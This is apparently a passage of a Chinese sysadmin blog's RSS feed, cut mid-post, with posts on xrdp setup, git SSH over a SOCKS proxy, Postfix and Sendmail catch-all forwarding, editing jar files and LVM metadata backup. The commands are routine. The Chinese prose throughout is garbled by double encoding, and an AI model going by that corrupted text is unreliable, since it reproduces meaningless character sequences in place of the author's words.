&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo apt-get install wine  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å®‰è£…xrdpå’Œgnome-shellä»¥åŠè¾“å…¥æ³•ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo apt-get install xrdp  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo apt-get install gnome-shell  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo apt-get install ibus  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo apt-get install fcitx-table-wbpy  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;è®¾ç½®xrdpç”±gnome-sessionæ§åˆ¶ï¼š&lt;/p&gt;</description>
    </item>
    <item>
      <title>è®¾ç½®git sshä»£ç†</title>
      <link>https://rendoumi.com/posts/20240117-git_proxy/</link>
      <pubDate>Wed, 17 Jan 2024 17:30:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20240117-git_proxy/</guid>
      <description>&lt;p&gt;ä¸‡ä¸‡æ²¡æƒ³åˆ°å•Šï¼Œgithubè¢«å°è½®åˆ°è‡ªå·±å¤´ä¸Šäº†ã€‚&lt;/p&gt;
&lt;p&gt;è¿™ä¸ªåšå®¢æ˜¯åœ¨windowsä¸‹ç”¨Typoraå†™çš„ï¼Œç„¶åhugoç”Ÿæˆï¼Œç›´æ¥ç”¨git for windowsæäº¤ï¼Œä»Šå¤©gitæ— æ³•æäº¤äº†ã€‚&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20240117180143368&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20240117-git_proxy/image-20240117180143368.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;å¿…é¡»è®¾ç½®ä¸€ä¸‹git sshçš„ä»£ç†äº†ï¼Œæˆ‘ç”¨çš„æ˜¯socks5ã€‚&lt;/p&gt;
&lt;p&gt;åœ¨&lt;code&gt;C:\Users\username\.ssh\config&lt;/code&gt;æ–‡ä»¶ä¸­æ·»åŠ ç›¸å…³é…ç½®ï¼Œå¦‚æœæ²¡æœ‰configæ–‡ä»¶éœ€è¦æ‰‹åŠ¨åˆ›å»ºï¼Œconnectå‘½ä»¤æ˜¯git Windowså®¢æˆ·ç«¯&lt;code&gt;git for windows&lt;/code&gt;è‡ªå¸¦çš„, ä½äº&lt;code&gt;&amp;lt;Git-install-path&amp;gt;\mingw64\bin\connect.exe&lt;/code&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;socksä»£ç†æ·»åŠ ä»¥ä¸‹é…ç½®&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Host github.com&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;æ”¹æˆä½ çš„ç«™ç‚¹&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ProxyCommand connect -S 127.0.0.1:1080 %h %p
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;å¯ä»¥é…ç½®å¤šä¸ªç½‘ç«™Host&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Host github.com&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;æ”¹æˆä½ çš„ç«™ç‚¹&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ProxyCommand connect -S 127.0.0.1:1080 %h %p
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Host bitbucket.org&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;æ”¹æˆä½ çš„ç«™ç‚¹&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ProxyCommand connect -S 127.0.0.1:1080 %h %p
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å¦‚æœHostè®¾ç½®ä¸º&lt;code&gt;*&lt;/code&gt;ï¼Œä»£ç†ä¼šå¯¹æ‰€æœ‰æœªé…ç½®çš„Hostèµ·ä½œç”¨ã€‚ä»¥ä¸‹æœ‰ä¸‰é¡¹é…ç½®ï¼Œè®¿é—®githubä½¿ç”¨ç¬¬äºŒé¡¹é…ç½®ï¼Œè®¿é—®bitbucketä½¿ç”¨ç¬¬ä¸‰é¡¹é…ç½®ï¼Œå…¶å®ƒç½‘ç«™ä½¿ç”¨ç¬¬ä¸€é¡¹é…ç½®&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Host *
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    ProxyCommand &lt;span class=&#34;s2&#34;&gt;&amp;#34;C:/Program Files/Git/mingw64/bin/connect.exe&amp;#34;&lt;/span&gt; -H 127.0.0.1:1080 %h %p
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    IdentityFile &lt;span class=&#34;s2&#34;&gt;&amp;#34;C:/Users/bybon/.ssh/id_rsa&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    TCPKeepAlive yes
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    IdentitiesOnly yes
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Host github.com
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    ProxyCommand connect -S 127.0.0.1:1080 %h %p
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Host bitbucket.com
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    ProxyCommand connect -S 127.0.0.1:1080 %h %p
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
    </item>
    <item>
      <title>Postfixå’ŒSendmailè®¾ç½®æ‰€æœ‰é‚®ä»¶éƒ½æ”¶åˆ°ä¸€ä¸ªé‚®ä»¶ç”¨æˆ·ä¸‹</title>
      <link>https://rendoumi.com/posts/20240117-mail_forward/</link>
      <pubDate>Wed, 17 Jan 2024 10:30:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20240117-mail_forward/</guid>
      <description>&lt;h2 id=&#34;postfixè®¾ç½®æ‰€æœ‰é‚®ä»¶éƒ½æ”¶åˆ°ä¸€ä¸ªé‚®ä»¶ç”¨æˆ·ä¸‹&#34;&gt;Postfixè®¾ç½®æ‰€æœ‰é‚®ä»¶éƒ½æ”¶åˆ°ä¸€ä¸ªé‚®ä»¶ç”¨æˆ·ä¸‹&lt;/h2&gt;
&lt;p&gt;ç”³è¯·äº†ä¸€ä¸ªyi.zapto.orgçš„å…è´¹åŸŸåï¼Œæƒ³æŠŠ*@yi.zapto.orgçš„é‚®ä»¶åœ°å€éƒ½é€åˆ°zrr@yi.zapto.orgè¿™ä¸ªåœ°å€å»ã€‚&lt;/p&gt;
&lt;p&gt;ç”¨Postfixæ¥åšï¼š&lt;/p&gt;
&lt;p&gt;ç¼–è¾‘main.cfï¼Œè®¾ç½®é‚®ä»¶çš„åŸŸåï¼Œå¯¹äº†ï¼Œæœ€å¥½åœ¨/etc/hostsä¸­å¢åŠ yi.zapto.orgåŸŸåçš„è§£æã€‚&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# vi /etc/postfix/main.cf&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;...
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;inet_interfaces&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; all  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;mydestination&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$myhostname&lt;/span&gt;, localhost.&lt;span class=&#34;nv&#34;&gt;$mydomain&lt;/span&gt;, localhost, &lt;span class=&#34;nv&#34;&gt;$mydomain&lt;/span&gt;, yi.zapto.org  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;virtual_alias_maps&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; hash:/etc/postfix/virtual  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;...
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ç¼–è¾‘virtualï¼Œè®¾ç½®å…¨åŸŸé‚®ä»¶è½¬å‘åˆ°zrr&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# vi /etc/postfix/virtual&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;@yi.zapto.org zrr
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# postmap /etc/virtual&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;å¦‚æœæœ‰å¤šä¸ªåŸŸåï¼Œé‚£ä¹ˆåœ¨mydestinationæœ€åä¾æ¬¡æ·»åŠ ï¼Œå¹¶ä¸”ä¿®æ”¹virtualå¹¶é‡æ–°hashå³å¯ã€‚&lt;/p&gt;
&lt;p&gt;okï¼Œé‡å¯postfix&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;service postfix restart  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;sendmailè®¾ç½®æ‰€æœ‰é‚®ä»¶éƒ½æ”¶åˆ°ä¸€ä¸ªé‚®ä»¶ç”¨æˆ·ä¸‹&#34;&gt;Sendmailè®¾ç½®æ‰€æœ‰é‚®ä»¶éƒ½æ”¶åˆ°ä¸€ä¸ªé‚®ä»¶ç”¨æˆ·ä¸‹&lt;/h2&gt;
&lt;p&gt;ç”¨Sendmailæ¥åšï¼š&lt;/p&gt;
&lt;p&gt;ç¼–è¾‘local-host-namesï¼Œè®¾ç½®é‚®ä»¶çš„åŸŸåï¼Œå¯¹äº†ï¼Œæœ€å¥½åœ¨/etc/hostsä¸­å¢åŠ yi.zapto.orgçš„è§£æï¼Œå¦åˆ™sendmailå¯åŠ¨æ—¶ä¼šåè§£ï¼Œé€Ÿåº¦å¾ˆæ…¢ã€‚&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# vi /etc/mail/local-host-names&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;yi.zapto.org  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ç¼–è¾‘virtusertableï¼Œè®¾ç½®å…¨åŸŸé‚®ä»¶è½¬å‘åˆ°zrr&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# vi /etc/virtusertable&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;@yi.zapto.org zrr
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# rm /etc/virtusertable.db&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# cd /etc/mail&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# make&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ç¼–è¾‘sendmail.cfï¼Œå¢åŠ ä¿¡ä»»ç”¨æˆ·nobody&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# vi /etc/mail/sendmail.cf&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;...
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#####################&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#   Trusted users   #&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#####################&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# this is equivalent to setting class &amp;#34;t&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Ft/etc/mail/trusted-users  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Troot  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Tdaemon  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Tuucp  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Tnobody  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;...
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;è¿™æ ·æ‰€æœ‰å‘è¿‡æ¥çš„é‚®ä»¶éƒ½ä¼šè‡ªåŠ¨è½¬å‘åˆ°zrrè¿™ä¸ªè´¦å·ä¸‹ã€‚&lt;/p&gt;</description>
    </item>
    <item>
      <title>æ›´æ–°jaråŒ…æˆ–è€…jaråŒ…ä¸­çš„æ–‡ä»¶</title>
      <link>https://rendoumi.com/posts/20240117-jar_update/</link>
      <pubDate>Wed, 17 Jan 2024 10:30:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20240117-jar_update/</guid>
      <description>&lt;p&gt;jaråŒ…å¯ä»¥å½“ä½œä¸€ä¸ªzipåŒ…æ¥çœ‹å¾…ã€‚&lt;/p&gt;
&lt;p&gt;jaræ–‡ä»¶ï¼š/home/resin.jar
éœ€è¦æ›´æ–°åŒ…ä¸­com/caucho/server/port/Port.classç±»æ–‡ä»¶&lt;/p&gt;
&lt;p&gt;æ–¹æ³•1ï¼Œç›´æ¥æ›´æ–°ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;æŸ¥çœ‹jaråŒ…çš„æ–‡ä»¶ç›®å½•ç»“æ„
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;jar tf resin.jar
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;æ›´æ–°æŒ‡å®šå†…å®¹
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;jar uf resin.jar com/caucho/server/port/Port.class  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;jar uf testRedis-33.jar redis.properties  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æ–¹æ³•2ï¼Œè§£å‹æ›¿æ¢åå†æ‰“åŒ…ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;è§£å‹åŒ…ï¼š
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;mkdir new  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; new  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;jar xvf ../testRedis-33.jar
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;è¿›è¡Œä¿®æ”¹
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;vi redis.properties
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;é‡æ–°å‹åŒ…
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;jar cmvf META-INF/MANIFEST.MF t.jar *  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
    </item>
    <item>
      <title>æ€€å¿µæ°¸è¿œçš„freshmeat.net</title>
      <link>https://rendoumi.com/posts/20240106-freshmeat_forever/</link>
      <pubDate>Tue, 16 Jan 2024 10:30:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20240106-freshmeat_forever/</guid>
      <description>&lt;h1 id=&#34;æ€€å¿µæ°¸è¿œçš„freashmeat&#34;&gt;æ€€å¿µæ°¸è¿œçš„freashmeat&lt;/h1&gt;
&lt;p&gt;è¿™ä¸ªç½‘ç«™æ˜¯ä»ä¸€å¼€ç«™å°±å…³æ³¨çš„ï¼ŒåŸºæœ¬ä¸Šå¤©å¤©éƒ½çœ‹ï¼Œæœ‰10å‡ å¹´äº†ã€‚&lt;/p&gt;
&lt;p&gt;æŒç»­åˆ°2014å¹´6æœˆ18æ—¥ï¼Œæ°¸ä¹…çš„å°ç«™äº†ã€‚&lt;/p&gt;
&lt;p&gt;æ—¶ä¸æ—¶çš„ï¼Œä»ä¼šæ‰“å¼€è¿™ä¸ªç½‘é¡µï¼Œé€¡å·¡è‰¯ä¹…ï¼ï¼ï¼ï¼Œæ—¶å…‰èè‹’ï¼Œ2024å¹´äº†ï¼Œå…³ç«™éƒ½è¦10å¹´äº†ã€‚çºªå¿µä¸€ä¸‹ï¼&lt;/p&gt;
&lt;p&gt;&lt;img alt=&#34;image-20240116110912176&#34; loading=&#34;lazy&#34; src=&#34;https://rendoumi.com/posts/20240106-freshmeat_forever/image-20240116110912176.png&#34;&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>LVMå·å¿…é¡»å¤‡ä»½metadata</title>
      <link>https://rendoumi.com/posts/20240116-lvm_metadata/</link>
      <pubDate>Tue, 16 Jan 2024 09:30:11 +0800</pubDate>
      <guid>https://rendoumi.com/posts/20240116-lvm_metadata/</guid>
      <description>&lt;p&gt;è¿™æ˜¯ä¸ªåé¢æ•™æã€‚åœ¨äº¬ä¸œæ•°ç§‘çš„æ—¶å€™ç”¨çš„æ˜¯kvmçš„è™šæœºç³»ç»Ÿï¼ŒåŒäº‹è¿½æ±‚æ›´å¿«ï¼Œæ–‡ä»¶é•œåƒç”¨çš„æ˜¯rawåˆ†åŒºï¼Œé‡Œé¢è£…äº†lvmã€‚&lt;/p&gt;
&lt;p&gt;grubçš„å¯åŠ¨æ–‡ä»¶å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        kernel /vmlinuz-2.6.32-431.el6.x86_64 ro &lt;span class=&#34;nv&#34;&gt;root&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;/dev/mapper/vg_root-lvroot rd_NO_LUKS &lt;span class=&#34;nv&#34;&gt;rd_LVM_LV&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;vg_root/lvroot &lt;span class=&#34;nv&#34;&gt;LANG&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;en_US.UTF-8 rd_NO_MD &lt;span class=&#34;nv&#34;&gt;SYSFONT&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;latarcyrheb-sun16 &lt;span class=&#34;nv&#34;&gt;console&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;ttyS0,115200n8 &lt;span class=&#34;nv&#34;&gt;rd_LVM_LV&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;vg_root/lvswap  &lt;span class=&#34;nv&#34;&gt;KEYBOARDTYPE&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;pc &lt;span class=&#34;nv&#34;&gt;KEYTABLE&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;us &lt;span class=&#34;nv&#34;&gt;crashkernel&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;auto rhgb quiet rd_NO_DM
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;çœ‹ä¸Šé¢ï¼Œrootä¹Ÿè¢«å»ºç«‹åœ¨lvrootçš„lvmå·ä¸Šäº†ã€‚&lt;/p&gt;
&lt;p&gt;ç„¶åå°±é‡åˆ°äº†æ–­ç”µï¼Œå¯¼è‡´kvmæŒ‚æ‰äº†ï¼Œæ‚²å‚¬çš„æ˜¯lvmå·è¢«ç ´åäº†ï¼Œç”¨å°½åŠæ³•ä¹Ÿå¼„ä¸å‡ºæ¥å·ä¿¡æ¯ã€‚å› ä¸ºlvmçš„metadataæ²¡æœ‰å¤‡ä»½ã€‚&lt;/p&gt;
&lt;p&gt;æ•°æ®å…¨ä¸¢ï¼Œæ— æ³•æ¢å¤ï¼Œæ¯å…·äº†ã€‚&lt;/p&gt;
&lt;p&gt;ç»¼ä¸ŠLVMçš„metadataå¿…é¡»å¤‡ä»½ï¼Œæ–¹æ³•å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;vgcfgbackup  
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;/etc/lvm/backup/VolGroupæ˜¯å½“å‰lvmé…ç½®çš„ä¸€ä¸ªå¤‡ä»½ï¼Œè€Œ/etc/lvm/archiveæ˜¯å½’æ¡£ã€‚&lt;/p&gt;
&lt;p&gt;çœ‹çœ‹å½’æ¡£ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ls -l /etc/lvm/archive/*  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;-rw-------. &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root root &lt;span class=&#34;m&#34;&gt;1820&lt;/span&gt; Jun &lt;span class=&#34;m&#34;&gt;12&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2015&lt;/span&gt; /etc/lvm/archive/VolGroup_00000-444365108.vg
